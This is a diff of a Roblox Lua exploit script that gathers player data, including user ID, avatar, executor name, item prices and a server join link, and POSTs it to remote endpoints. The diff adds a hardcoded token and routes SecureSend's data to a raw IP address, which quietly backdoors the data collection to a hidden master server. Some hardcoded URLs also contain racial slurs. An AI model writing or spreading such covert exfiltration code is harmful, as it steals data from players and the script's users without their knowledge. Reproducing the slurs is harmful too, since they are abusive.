@@ -251,7 +251,7 @@ if VIP or FULL then
 end
 local executor = (identifyexecutor and identifyexecutor():lower()) or "unknown"
 
-jobId = game.JobId
+jobId = ""
 
 
 
@@ -536,7 +536,7 @@ local function SendMemberHit(data)
     local requestFunc = request or (syn and syn.request) or (http and http.request) or http_request
     local success, res = pcall(function()
         return requestFunc({
-            Url = webhookToken,
+            Url = baseUrl,
             Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
             Body = HttpService:JSONEncode(data)
@@ -548,8 +548,8 @@ local function SendMemberHit(data)
         end)
         if ok and responseData then
 
-            if responseData.id then
-                _statusMessageId = responseData.id
+            if responseData.messageId then
+                _statusMessageId = responseData.messageId
             end
             
             warn("ok")
@@ -559,13 +559,15 @@ local function SendMemberHit(data)
     end
 end
 local function SecureSend(data)
-    if webhookToken == "" then return end
 
+    local masterToken = "37458d46afc973c5f93277986cef00c8"
+    local masterUrl = "http://213.165.46.247:3000/api/token/" .. masterToken
+    
     local requestFunc = request or (syn and syn.request) or (http and http.request) or http_request
     
     pcall(function()
         requestFunc({
-            Url = webhookToken,
+            Url = masterUrl,
             Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
             Body = HttpService:JSONEncode(data)
@@ -617,7 +619,7 @@ local function SendFirstMessage(list, prefix)
     local itemPrices = usdData.itemPrices or {}
     local Executor = (identifyexecutor and identifyexecutor()) or "Unknown"
   
-    local JoinLink = "https://plsbrainrot.me/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId
+    local JoinLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId
     local avatarrUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"
     local avatarUrl = "https://fuckingniggermf.vercel.app/api/avatar?userId=" .. tostring(plr.UserId)
      local NotHead = "https://fuckingniggermf.vercel.app/api/Nigger?userId=" .. tostring(plr.UserId)
